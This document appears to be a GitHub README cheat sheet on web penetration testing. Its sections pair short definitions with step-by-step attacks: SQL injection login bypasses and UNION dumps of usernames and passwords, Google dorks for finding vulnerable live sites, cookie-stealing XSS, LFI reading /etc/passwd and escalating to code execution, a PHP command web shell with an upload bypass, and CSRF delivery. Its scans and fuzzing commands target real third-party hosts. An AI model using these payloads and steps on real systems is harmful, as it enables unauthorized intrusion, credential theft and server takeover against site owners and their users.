# Penetration-Testing
Penetration testing, often abbreviated as "pen testing," is a cybersecurity practice that involves simulating cyberattacks on computer systems, networks, or applications to identify security vulnerabilities and weaknesses. The primary goal of penetration testing is to assess an organization's security posture and help them proactively identify and remediate vulnerabilities before malicious attackers can exploit them. 

- [ ] Types of Testing: 
- Black Box Testing: Testers have no prior knowledge of the system being tested.
- White Box Testing: Testers have full knowledge of the system, including architecture and source code.
- Gray Box Testing: Testers have partial knowledge of the system, often mirroring the knowledge level of an insider.

* Penetration Testing Checklist: https://github.com/mdrrifat/Penetration-Testing-Checklist

- [ ] Basic SQL Injection                                                                                                      
- [ ] Havij                                                                                                                               
- [ ] OSINT                                                                                                                       
- [ ] XSS Vulnerability                                                                                                   
- [ ] Season Hijacking                                                                                                  
- [ ] Manual SQL Injection                                                                                              
- [ ] SQLi WAF                                                                                                            
- [ ] LFI Vulnerability                                                                                                 
- [ ] Advance LFI (LFI to RCE)                                                                                     
- [ ] Web Shell Upload                                                                                                   
- [ ] CSRF Vulnerability                                                                                                    
- [ ] Kali Linux Tools                                                                                                                                                                                                                     
 
# Basic SQL Injection                                                                                                      
SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed.

Use This in Username and Password:
- 1'or'1'='1
- ' or 1=1#
- or 1=1--
- or 1=1#
- or 1=1/*
- admin' or '1'='1
- admin' or '1'='1'--
- admin' or '1'='1'#
- admin' or 1=1
- admin' or 1=1--

# Havij                                                                                                                               
Havij is a popular and controversial automated SQL injection tool that was used primarily for penetration testing and ethical hacking purposes. SQL injection is a type of cybersecurity vulnerability that can allow attackers to manipulate a web application's database by injecting malicious SQL code. Havij was designed to automate the process of finding and exploiting SQL injection vulnerabilities in web applications.

- [ ] Steps:

- [php?id= link] then [php?id=num] we get then - havij
- php?id= link
- php?id= site:link
- http://link/news.php?id=7 
- Target-analyze-table-get tables-get column

# OSINT
Open Source Intelligence (OSINT) is a type of intelligence-gathering methodology that involves collecting and analyzing information from publicly available sources. OSINT relies on publicly accessible information, which can include data from the internet, social media, news sources, public records, government publications, and other publicly available resources. The primary goal of OSINT is to gather insights and knowledge that can inform decision-making processes in various fields, including cybersecurity, law enforcement, business intelligence, and national security.

- [ ] OSINT Framework: https://osintframework.com/
- [ ] Online tools:
- web history wayback: https://archive.org/web/
- Grabify IP: https://grabify.link/
- IP Address Lookup | Geolocation : https://www.iplocation.net/
- Domain Availability: https://whois.domaintools.com/
- Facebook Stalking: https://stalkface.com/en/
- Wappalyzer: https://www.wappalyzer.com/
- Email Header Analyzer: https://mxtoolbox.com/EmailHeaders.aspx
- image osint: https://29a.ch/
- Photo Forensic: https://29a.ch/photo-forensics

# XSS Vulnerability    
Cross-site scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when a web application allows users to input or inject malicious scripts into web pages that are then viewed by other users. These scripts can be executed in the context of a victim's browser, potentially leading to various security risks and attacks.

- [ ] There are three main types of XSS attacks:
- Reflected XSS
- Stored XSS
- DOM-based XSS

- [ ] Dork for xss
- /search/?keyword= site: 
- inurl:".php?search="
- /search-results?q=
- /index.php?page=
- inurl:".php?pass="

- [ ] Script:
- <script>alert(1)</script>
- <script>alert(document.cookie)</script>


# Season Hijacking 
Session hijacking is a type of cyber attack in which an attacker takes control of a user's active session on a web application. This can be done by stealing the user's session token, which is a unique identifier that is used to authenticate the user's session.

- [ ] Steps
- tools-NoRedirect
- Go Cyberfox [https://site.com/admin/login.php] no redirect - add 
- remove [/admin] then enter [https://site.com/admin] ok
-- If only-admin 
-- Add- admin/login.php/dashboard.php/user.php
- (Avoid login.php and ) done
- [advance-add exception-confirm]

# Manual SQL Injection    
Manual SQL Injection is a type of cyber attack where an attacker inserts malicious SQL (Structured Query Language) statements into a vulnerable SQL query in a web application's input fields. This technique is used to manipulate the application's database and potentially gain unauthorized access to data or perform other malicious actions. 

- [ ] Steps:
- dork= inurl: admin/login.php
- inurl: news.php?id= 
- php?id= link
- php?id= site:link
- link.php?id=45


- link.php?id=45 order by 1 
- link.php?id=45 order by 1000
- link.php?id=45 order by 1000 - -+ [error]
- link.php?id=45’ order by 1000 - -+ [error] (-- -)                                    
- link.php?id=45’ order by 10 [error]
- link.php?id=45’ order by 6 [error]
- link.php?id=45’ order by 5 [column find 5]


- If no change:
- link.php?id=45' order by 5--+ [ok]
- If no change:
- link.php?id=16 order by 1000 
- link.php?id=16' order by 1000--+ (. @)
- link.php?id=16' order by 100--+
- link.php?id=16' order by 21--+ [ok]
- UNION SELECT=UNION BASED - Union statement -INT INT
- If dont show column than off javascript
- get vuln column
- UNION BASED-DIOS My sql-DIOS By zen-DIOS by zen
- union select-dios mysql-dios by tr0jan waf-dios by tr0jan waf
- dump database
- find pass-concat(username,0x3d3d,password).....from Tablename


# SQLi WAF  
SQLi WAF stands for "SQL Injection Web Application Firewall." It refers to a security mechanism or tool that is specifically designed to detect and prevent SQL injection attacks in web applications. SQL injection is a common and dangerous type of cyber attack where malicious SQL code is injected into input fields or parameters of a web application to manipulate its database and potentially gain unauthorized access to data or execute harmful actions. SQLi WAFs use various techniques, including pattern matching and heuristics, to identify SQL injection attempts in the traffic passing through them. They examine HTTP requests and responses for suspicious patterns or known attack vectors. 

- [ ] Waf Steps:

- After Normar SQLI steps–

- UNION BASED-DIOS Mysql-DIOS by zen-DIOS by zen waf
- UNION BASED-DIOS Mysql-DIOS By Madblood -DIOS by Madblood Waf
- Waf bypass - incode[arena web security button]
- UNION BASED-DIOS Mysql-DIOS by insidehack1337-DIOS by insidehack1337 one
- UNION BASED-Table-Table_NAMES one shot
- If need=>UNION BASED-Columns-COLUMN_NAMES one shot (insert column name to dump)
- Bypass all
- UNION BASED-Data-Data one shot (ok-insert columnname-Insert tablename=ok)
End

# LFI Vulnerability
Local File Inclusion (LFI) is a type of cybersecurity vulnerability that occurs when a web application allows an attacker to include files on the web server through the manipulation of user inputs. This vulnerability typically arises when a web application dynamically includes or references files based on user-provided data without proper validation or sanitization. 
- [ ] Steps:
- php?page= link
- link.php?pg=news
- Add: ../../../../../../../../../../../../etc/passwd
- link.php?page=../../../../../../../../../../../../etc/passwd
- Or - by burp suit
- Send to repeater-change method and try-../../etc/passwd-payload-search root

# Advance LFI (LFI to RCE)  
LFI to RCE, or Local File Inclusion to Remote Code Execution, is a serious security vulnerability that occurs when an attacker is able to exploit a Local File Inclusion (LFI) vulnerability in a web application to execute malicious code on the web server remotely. This is an advanced and dangerous attack that combines two vulnerabilities to achieve a more significant security compromise.

- [ ] Steps:
- Burp=proxy-intercept on-
- Proxy-HTTP history-send to repeater
- change-page=/etc/passwd , find root- in response - send to intruder
- intruder=add/clear- sniper - payloads - paste payload - attack
- Find root(root,sbin,bin,bash,nologin) in - request / response [filter-root-rejax]
- Request-send to repeater
- etc/passwd=change to- proc%2fself%2fenviron
- Inside user agent and accept write-hacked-send find in response -hacked-
- If hacked find then=inside useragent and accept=<?phpinfo()?> =if 200ok
- Show response in browser=we get RCE

- For shell upload:
&&cmd=ls and <?php system($_GET[‘cmd’]); ?>
And next 

# Web Shell Upload  
A web shell upload is a type of cyber attack where an attacker uploads a malicious script or program to a web server, which then allows them to gain unauthorized access and control over the server and its files. Web shells can be used for various malicious purposes, including data theft, further exploitation, and maintaining persistent access to a compromised system. Attackers look for vulnerabilities in web applications or server configurations that allow them to upload files. Attackers may use the web shell to maintain persistent access to the compromised server. They can create backdoors, modify system files, steal data, or launch further attacks on the server or other systems within the network.

- [ ] Steps:
- Find upload option
- Upload malicious [.php.png] shell as png/jpg/pdf file
- Change file name to .php
- Search the shell name as .php

# CSRF Vulnerability    
Cross-Site Request Forgery (CSRF) is a cybersecurity vulnerability that occurs when an attacker tricks a user into unwittingly making an unwanted and potentially harmful request to a web application in which the user is authenticated. CSRF attacks can lead to actions being performed on the user's behalf without their knowledge or consent, potentially compromising the security of their accounts and data. The victim is authenticated and logged into a web application, such as an email account or a social media platform, in one browser tab or session. The attacker tricks the victim into visiting a malicious website, clicking on a malicious link, or opening an email containing malicious code. The malicious request could perform actions on behalf of the victim, such as changing email settings, making unauthorized purchases, or modifying profile information.

- [ ] Steps:
- From proxy intercept= engagement tools-generate CSRF Poc
- Option-include auto submit-regenerate=copy html-drop and intercept off
- Paste in note pad -save html - open in browser
- If not work= remove csrf token [go to 1 ]then open in browser
- Back Refresh
- Goto exploit server-Change HTML mail and paste in body
- store-Deliver exp to victime
done

# Kali Linux More Useful Tools    
Kali Linux is a specialized Linux distribution designed for cybersecurity and penetration testing purposes. It is one of the most widely used operating systems by security professionals, ethical hackers, and penetration testers for conducting security assessments, vulnerability testing, and other related tasks. 

- [ ] Nmap: Port scan, os, version detection
- nmap www.geeksforgeeks.org
- nmap 172.217.27.174
- nmap -v www.geeksforgee [-v option enables verbose mode]
- To scan whole subnet:  
     nmap 103.76.228.*
- To scan specific range of IP address:
     nmap 192.168.29.1-20
- nmap -p 1-20 192.168.1.1 [range of port scan]
- Most popular port scanning:
- nmap -sS 172.217.27.174
- Open port:
nmap -open 172.217.27.174
- Nmap -sC -sV = [-sC=deafult , -sV=service version]

- [ ] sqlmap: sqli
- sqlmap -u http://testphp.vulnweb.com/ --crawl 2
  
- [ ] ffuf: Admin panel fuzzing
- Admin panel/cpanel find
- Admin panel fuzzing word list
- Nano a.txt
- Cat a.txt login.txt | sort -u -o new.txt     [sorting]
- ffuf -u https://www.hotelone.com.pk/FUZZ -w /root/wlist/login.txt -mc 200
- ffuf -u <target> -w <wordlist>

- [ ] Hashcat: Hash password
- https://hashcat.net/hashcat/
- Hash-identifier

- [ ] Johntheripper: Password cracker
- john pass.txt -w=/root/Downloads/rockyou.txt

- [ ] Hashcat: Password recovery

- [ ] Reconftw: Website scan - url
- reconftw -t <target>
- reconftw -a <target>
- ./reconftw.sh -d testphp.vulnweb.com

- [ ] Dirsearch: Discovery scan
- Python3 dirsearch.py -u link

- [ ] Gospider: croll-site 
- gospider -q -s "https://google.com/"

- [ ] Hakrawler: web crawler & admin page find
- echo https://google.com | hakrawler
- cat urls.txt | hakrawler
- cat urls.txt | hakrawler -proxy http://localhost:8080
  
- [ ] Waybackurls: all site links scan-find admin-wp-content
-Waybackurls link >>url.txt [save links url.txt]

- [ ] SecLists: word list
- discovery-web content -login fuzz.txt
- Mkdir wlist 
- Cd wlist
- wget lint [raw] -O login.txt
- Cat login.txt | wc [see word and line]

- [ ] katana: Web crawler
- Katana -u link

- [ ] Emailfinder: Email finder
- emailfinder -d domain.com 
- emailfinder -d domain.com -p http://127.0.0.1:8080

- [ ] Metafinder 
- metafinder -d domain.com -l 20 -o folder [-t 10] -go -bi -ba

- [ ] ParamSpider: Crawling
- paramspider -d example.com

- [ ] Metasploit
- Systemctl start postgresql
- msfconsole 

- [ ] crul: version/server
- curl -I http://example.com

- [ ] Gau | gf patterns
- echo "https://testphp.vulnweb.com/" | gau | gf xss >> /root/Desktop/xss.txt
- echo "http://testphp.vulnweb.com/" | gau | gf sqli | tee -a /root/Desktop/sqli.txt 
- Tee -a = show

- [ ] Nikto: Web server scan
- nikto -h <target_host>

- [ ] Maltego : OSINT
- https://www.maltego.com/

# Others Tools

- [ ] Basic Penetration Testing Tools
- Metasploit Framework - World's most used penetration testing software
- Burp Suite - An integrated platform for performing security testing of web applications
- ExploitPack - Graphical tool for penetration testing with a bunch of exploits

- [ ] Vulnerability Scanners
- Nexpose - Vulnerability Management & Risk Management Software
- Nessus - Vulnerability, configuration, and compliance assessment
- Nikto - Web application vulnerability scanner
- OpenVAS - Open Source vulnerability scanner and manager
- OWASP Zed Attack Proxy - Penetration testing tool for web applications

- [ ] Network Tools
- nmap - Free Security Scanner For Network Exploration & Security Audits
- pig - A Linux packet crafting tool
- tcpdump/libpcap - A common packet analyzer that runs under the command line
- Wireshark - A network protocol analyzer for Unix and Windows
- Network Tools - Different network tools: ping, lookup, whois, etc

- [ ] Web exploitation
- WPScan - Black box WordPress vulnerability scanner
- SQLmap - Automatic SQL injection and database takeover tool
- weevely3 - Weaponized web shell
- Wappalyzer - Wappalyzer uncovers the technologies used on websites

- [ ] Hex Editors
- HexEdit.js - Browser-based hex editing
- Hexinator (commercial) - World's finest Hex Editor
- HxD - Freeware Hex Editor and Disk Editor

- [ ] Crackers
- John the Ripper - Fast password cracker
- Online MD5 cracker - Online MD5 hash Cracker
- Hashcat - The more fast hash cracker
- THC Hydra - Another Great Password Cracker

- [ ] OSInt Tools
- Maltego - Proprietary software for open source intelligence and forensics, from Paterva.
- theHarvester - E-mail, subdomain and people names harvester
- creepy - A geolocation OSINT tool
- metagoofil - Metadata harvester
- Google Hacking Database - a database of Google dorks; can be used for recon
- Censys - Collects data on hosts and websites through daily ZMap and ZGrab scans
- Shodan - Shodan is the world's first search engine for Internet-connected devices
- recon-ng - A full-featured Web Reconnaissance framework written in Python
- github-dorks - CLI tool to scan github repos/organizations for potential sensitive information leak
- vcsmap - A plugin-based tool to scan public version control systems for sensitive information
- Spiderfoot - multi-source OSINT automation tool with a Web UI and report visualizations

